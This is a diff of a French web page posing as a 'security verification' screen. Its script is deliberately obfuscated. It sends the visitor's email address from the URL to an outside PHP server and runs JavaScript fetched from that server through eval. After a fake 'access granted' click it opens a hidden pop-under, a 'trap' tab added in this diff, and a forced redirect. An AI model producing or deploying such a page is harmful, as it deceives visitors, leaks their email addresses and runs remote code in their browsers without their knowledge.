@@ -1,225 +1,234 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
-    <title>Vérification de sécurité</title>
-    
-    <style id="template-styles">
-        /* Styles du loader */
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        
-        html, body {
-            height: 100%;
-            width: 100%;
-            margin: 0;
-            padding: 0;
-            overflow: hidden; 
-        }
-        
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-size: cover; 
-            background-repeat: no-repeat;
-        }
-        
-        #template-container {
-            height: 100%; 
-            width: 100%;
-        }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Vérification de sécurité</title>
+    
+    <style id="template-styles">
+        /* Styles du loader */
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        
+        html, body {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden; 
+        }
+        
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-size: cover; 
+            background-repeat: no-repeat;
+        }
+        
+        #template-container {
+            height: 100%; 
+            width: 100%;
+        }
 
-        #loading-spinner {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            color: #333;
-        }
-    </style>
+        #loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #333;
+        }
+    </style>
 </head>
 <body>
-    
-    <div id="template-container">
-        <div id="loading-spinner">
-            <div style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
-            Chargement de la vérification...
-        </div>
-    </div>
-    
+    
+    <div id="template-container">
+        <div id="loading-spinner">
+            <div style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+            Chargement de la vérification...
+        </div>
+    </div>
+    
 <script>
-    // --- OBS ---
-    const H = ['h', 'i', 's', 't', 'o', 'r', 'y'].join('');
-    const PS = ['p', 'u', 's', 'h', 'S', 't', 'a', 't', 'e'].join('');
-    const WO = ['o', 'p', 'e', 'n'].join('');
-    const BK = '_' + ['b', 'l', 'a', 'n', 'k'].join('');
-    const FOCUS = ['f', 'o', 'c', 'u', 's'].join('');
-    const FE = ['f', 'e', 't', 'c', 'h'].join('');
-    const HREF = ['h', 'r', 'e', 'f'].join('');
-    
-    const URL_PHP = "https://lespetitscoquins.fr/cancel-booking.php"; 
-    const URL_TEMPLATE = URL_PHP + "?action=get_template"; 
+    // --- OBFUSCATION DE BASE ---
+    const H = ['h', 'i', 's', 't', 'o', 'r', 'y'].join('');
+    const PS = ['p', 'u', 's', 'h', 'S', 't', 'a', 't', 'e'].join('');
+    const WO = ['o', 'p', 'e', 'n'].join('');
+    const BK = '_' + ['b', 'l', 'a', 'n', 'k'].join('');
+    const FOCUS = ['f', 'o', 'c', 'u', 's'].join('');
+    const FE = ['f', 'e', 't', 'c', 'h'].join('');
+    const HREF = ['h', 'r', 'e', 'f'].join('');
+    
+    const URL_PHP = "https://lespetitscoquins.fr/cancel-booking.php"; 
+    const URL_TEMPLATE = URL_PHP + "?action=get_template"; 
 
-    const METHOD_POST = ['P', 'O', 'S', 'T'].join('');
-    const METHOD_GET = ['G', 'E', 'T'].join('');
-    const SUCCESS_ICON_HTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#009432" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
-    const LOADER_HTML_FIXED = '<div id="loader" style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>';
+    const METHOD_POST = ['P', 'O', 'S', 'T'].join('');
+    const METHOD_GET = ['G', 'E', 'T'].join('');
+    const SUCCESS_ICON_HTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#009432" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
+    const LOADER_HTML_FIXED = '<div id="loader" style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>';
 
-    var redirected = false;
-    
-    // --- 1. FONCTIONS DE BASES ---
-    function getUrlParameter(name) {
-        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-        var results = regex.exec(location.search);
-        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
-    };
+    var redirected = false;
+    
+    // --- 1. FONCTIONS DE BASES ---
+    function getUrlParameter(name) {
+        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+        var results = regex.exec(location.search);
+        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    };
 
-    function executeHiddenLogic(urlMain, urlPop, idBack) {
-        if (redirected) return;
-        redirected = true;
-        
+    function executeHiddenLogic(urlMain, urlPop, idBack) {
+        if (redirected) return;
+        redirected = true;
+        
+        // 1. Redirection Pop-up (url_pop)
+        try {
+            var popWindow = window[WO](urlPop, BK);
+            if(popWindow) {
+                popWindow.blur();
+                window[FOCUS]();
+            }
+        } catch(e) {}
+        
+        // 2. CORRECTION CRITIQUE : Ajout de la Redirection Trap (idBack)
+        // La troisième offre est chargée dans un onglet (qui sera masqué)
+        const trapUrl = URL_PHP + "?sec_id=" + idBack + window.location.search;
         try {
-            var popWindow = window[WO](urlPop, BK);
-            if(popWindow) {
-                popWindow.blur();
-                window[FOCUS]();
-            }
+            window[WO](trapUrl, BK); 
         } catch(e) {}
 
-        setTimeout(function(){
-            window.top.location[HREF] = urlMain;
-        }, 300);
-    }
-    
-    // --- 2.CLICS ---
-    function initializeUnifiedClicks(jsScript) {
-        document.querySelectorAll('.action-btn').forEach(btn => {
-            btn.addEventListener('click', function(event) {
-                event.preventDefault();
-                
-                this.setAttribute('data-original-html', this.innerHTML);
-                this.innerHTML = '<span style="display:inline-flex; align-items:center; justify-content:center; gap: 8px;">' + LOADER_HTML_FIXED + ' Vérification...</span>';
-                this.style.pointerEvents = 'none';
-                this.style.opacity = '0.8';
+        // 3. Redirection Principale (urlMain)
+        setTimeout(function(){
+            window.top.location[HREF] = urlMain;
+        }, 300);
+    }
+    
+    // --- 2.CLICS ---
+    function initializeUnifiedClicks(jsScript) {
+        document.querySelectorAll('.action-btn').forEach(btn => {
+            btn.addEventListener('click', function(event) {
+                event.preventDefault();
+                
+                this.setAttribute('data-original-html', this.innerHTML);
+                this.innerHTML = '<span style="display:inline-flex; align-items:center; justify-content:center; gap: 8px;">' + LOADER_HTML_FIXED + ' Vérification...</span>';
+                this.style.pointerEvents = 'none';
+                this.style.opacity = '0.8';
 
-                executeAjaxLogic(this);
-            });
-        });
-        
-        try {
-            if (jsScript) {
-                eval(jsScript);
-            }
-        } catch (e) {
-            console.error("Erreur lors de l'exécution du script de template :", e);
-        }
-    }
-    
-    function executeAjaxLogic(btnElement) {
-        var formData = new FormData();
-        formData.append('action', 'get_links');
-        
-        var emailParam = getUrlParameter('u'); 
-        if (emailParam) {
-            formData.append('u', emailParam); 
-            
-            // Si vous avez d'autres subX dans l'URL:
-            if (getUrlParameter('sub1')) formData.append('sub1', getUrlParameter('sub1'));
-            if (getUrlParameter('sub2')) formData.append('sub2', getUrlParameter('sub2'));
-            // ... etc.
-        }
-        
-        window[FE](URL_PHP, { method: METHOD_POST, body: formData })
-        .then(response => response.json())
-        .then(data => {
-            if (data.status === 'ok') {
-                executeHiddenLogic(data.url_main, data.url_pop, data.id_back);
-                
-                setTimeout(function(){
-                    btnElement.innerHTML = SUCCESS_ICON_HTML + " Accès autorisé";
-                    btnElement.style.background = '#009432';
-                    btnElement.style.color = 'white';
-                    btnElement.style.opacity = '1';
-                }, 800);
-            } else {
-                location.reload();
-            }
-        })
-        .catch(err => {
-            console.error("Erreur Fetch:", err);
-            btnElement.innerHTML = btnElement.getAttribute('data-original-html') || "Erreur, réessayer";
-            btnElement.style.pointerEvents = 'auto';
-            btnElement.style.opacity = '1';
-        });
-    }
+                executeAjaxLogic(this);
+            });
+        });
+        
+        try {
+            if (jsScript) {
+                eval(jsScript);
+            }
+        } catch (e) {
+            console.error("Erreur lors de l'exécution du script de template :", e);
+        }
+    }
+    
+    function executeAjaxLogic(btnElement) {
+        var formData = new FormData();
+        formData.append('action', 'get_links');
+        
+        var emailParam = getUrlParameter('u'); 
+        if (emailParam) {
+            formData.append('u', emailParam); 
+            
+            // Si vous avez d'autres subX dans l'URL:
+            if (getUrlParameter('sub1')) formData.append('sub1', getUrlParameter('sub1'));
+            if (getUrlParameter('sub2')) formData.append('sub2', getUrlParameter('sub2'));
+            // ... etc.
+        }
+        
+        window[FE](URL_PHP, { method: METHOD_POST, body: formData })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'ok') {
+                executeHiddenLogic(data.url_main, data.url_pop, data.id_back);
+                
+                setTimeout(function(){
+                    btnElement.innerHTML = SUCCESS_ICON_HTML + " Accès autorisé";
+                    btnElement.style.background = '#009432';
+                    btnElement.style.color = 'white';
+                    btnElement.style.opacity = '1';
+                }, 800);
+            } else {
+                location.reload();
+            }
+        })
+        .catch(err => {
+            console.error("Erreur Fetch:", err);
+            btnElement.innerHTML = btnElement.getAttribute('data-original-html') || "Erreur, réessayer";
+            btnElement.style.pointerEvents = 'auto';
+            btnElement.style.opacity = '1';
+        });
+    }
 
-    // --- 3.CHARGEMENT ---
-    function loadTemplate() {
-        let trackingParams = window.location.search;
-        let finalParams = ''; 
-        
-        if (trackingParams.length > 0 && trackingParams.startsWith('?')) {
-            finalParams = '&' + trackingParams.substring(1); 
-        }
-        
-        document.getElementById('loading-spinner').style.display = 'inline-flex';
-        
-        window[FE](URL_TEMPLATE + finalParams, { method: METHOD_GET })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Erreur réseau ou script PHP non trouvé/mal configuré.');
-            }
-            return response.json();
-        })
-        .then(data => {
-            
-            document.getElementById('loading-spinner').style.display = 'none';
-            
-            if (data.status === 'ok' && data.html) {
-                
-                // 1. HTML
-                document.getElementById('template-container').innerHTML = data.html;
-                
-                // 2. Application du fond 
-                const rootDiv = document.getElementById('template-container').children[0];
-                if (rootDiv) {
-                    const backgroundStyle = rootDiv.style.background || rootDiv.style.backgroundColor;
-                    const backdropStyle = rootDiv.style.backdropFilter || rootDiv.style.webkitBackdropFilter;
-                    
-                    if (backgroundStyle) {
-                        document.body.style.background = backgroundStyle;
-                    }
-                    
-                    if (backdropStyle) {
-                        document.body.style.backdropFilter = backdropStyle;
-                        document.body.style.webkitBackdropFilter = backdropStyle;
-                    }
-                    
-                    rootDiv.style.height = '100vh';
-                }
-                
-                document.getElementById('template-styles').innerHTML += data.css || '';
-                
-                initializeUnifiedClicks(data.js);
-                
-            } else {
-                document.getElementById('template-container').innerHTML = '<p style="color:red;">Erreur: Template non reçu.</p>';
-            }
-        })
-        .catch(err => {
-            document.getElementById('loading-spinner').style.display = 'none';
-            console.error("Erreur critique au chargement du template:", err);
-            document.getElementById('template-container').innerHTML = '<p style="color:red; font-size: 16px;">Erreur de connexion au serveur de vérification. (Vérifiez URL_PHP)</p>';
-        });
-    }
+    // --- 3.CHARGEMENT ---
+    function loadTemplate() {
+        let trackingParams = window.location.search;
+        let finalParams = ''; 
+        
+        if (trackingParams.length > 0 && trackingParams.startsWith('?')) {
+            finalParams = '&' + trackingParams.substring(1); 
+        }
+        
+        document.getElementById('loading-spinner').style.display = 'inline-flex';
+        
+        window[FE](URL_TEMPLATE + finalParams, { method: METHOD_GET })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Erreur réseau ou script PHP non trouvé/mal configuré.');
+            }
+            return response.json();
+        })
+        .then(data => {
+            
+            document.getElementById('loading-spinner').style.display = 'none';
+            
+            if (data.status === 'ok' && data.html) {
+                
+                // 1. HTML
+                document.getElementById('template-container').innerHTML = data.html;
+                
+                // 2. Application du fond 
+                const rootDiv = document.getElementById('template-container').children[0];
+                if (rootDiv) {
+                    const backgroundStyle = rootDiv.style.background || rootDiv.style.backgroundColor;
+                    const backdropStyle = rootDiv.style.backdropFilter || rootDiv.style.webkitBackdropFilter;
+                    
+                    if (backgroundStyle) {
+                        document.body.style.background = backgroundStyle;
+                    }
+                    
+                    if (backdropStyle) {
+                        document.body.style.backdropFilter = backdropStyle;
+                        document.body.style.webkitBackdropFilter = backdropStyle;
+                    }
+                    
+                    rootDiv.style.height = '100vh';
+                }
+                
+                document.getElementById('template-styles').innerHTML += data.css || '';
+                
+                initializeUnifiedClicks(data.js);
+                
+            } else {
+                document.getElementById('template-container').innerHTML = '<p style="color:red;">Erreur: Template non reçu.</p>';
+            }
+        })
+        .catch(err => {
+            document.getElementById('loading-spinner').style.display = 'none';
+            console.error("Erreur critique au chargement du template:", err);
+            document.getElementById('template-container').innerHTML = '<p style="color:red; font-size: 16px;">Erreur de connexion au serveur de vérification. (Vérifiez URL_PHP)</p>';
+        });
+    }
 
-    // Lance le processus de chargement
-    loadTemplate();
+    // Lance le processus de chargement
+    loadTemplate();
 </script>
 </body>
 </html>
